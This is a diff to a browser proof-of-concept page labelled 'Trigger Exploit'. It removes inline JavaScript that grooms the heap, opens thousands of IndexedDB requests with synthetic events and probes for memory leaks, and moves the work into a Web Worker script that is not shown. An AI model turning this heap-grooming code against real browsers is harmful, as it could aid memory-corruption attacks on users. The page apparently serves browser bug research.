@@ -30,65 +30,18 @@
     <button id="trigger">Trigger Exploit</button>
     <div id="output"></div>
     <script>
-        function stressHeap() {
-            const buffers = [];
-            for (let i = 0; i < 20; i++) {
-                const buf = new Uint8Array(4 * 1024);
-                buf.fill(0x41);
-                buffers.push(buf);
-            }
-            return buffers;
-        }
-
-        function checkMemoryLeak() {
-            const buf = new Uint8Array(4);
-            buf.fill(0x46);
-            return buf[0] !== 0x46 ? `Leak: 0x${buf[0].toString(16)}` : null;
-        }
-
         function log(message) {
             const output = document.getElementById('output');
             output.textContent += message + '\n';
         }
 
         function triggerExploit() {
-            log('Grooming heap...');
-            stressHeap();
-
-            log('Opening IndexedDB...');
-            for (let i = 0; i < 5000; i++) {
-                let req = indexedDB.open(`db${i}`);
-                let ev = new Event('mine');
-                try {
-                    req.dispatchEvent(ev);
-                } catch (e) {
-                    log(`Error at iteration ${i}: ${e.message}`);
-                }
-                req = null;
-                ev = null;
-                if (i % 500 === 0) {
-                    stressHeap();
-                    const leak = checkMemoryLeak();
-                    if (leak) {
-                        log(leak);
-                    }
-                }
-            }
-
-            log('Checking IndexedDB state...');
-            let req = indexedDB.open('testdb');
-            if (req.readyState === 'done') {
-                log('IndexedDB state as expected');
-            } else {
-                log(`Unexpected IndexedDB state: ${req.readyState}`);
-            }
-
-            const leak = checkMemoryLeak();
-            if (leak) {
-                log(leak);
-            } else {
-                log('No memory changes detected');
-            }
+            log('Starting Web Worker...');
+            const worker = new Worker('idbworker.js');
+            worker.onmessage = function(e) {
+                log(e.data);
+            };
+            worker.postMessage('start');
         }
 
         document.getElementById('trigger').addEventListener('click', triggerExploit);
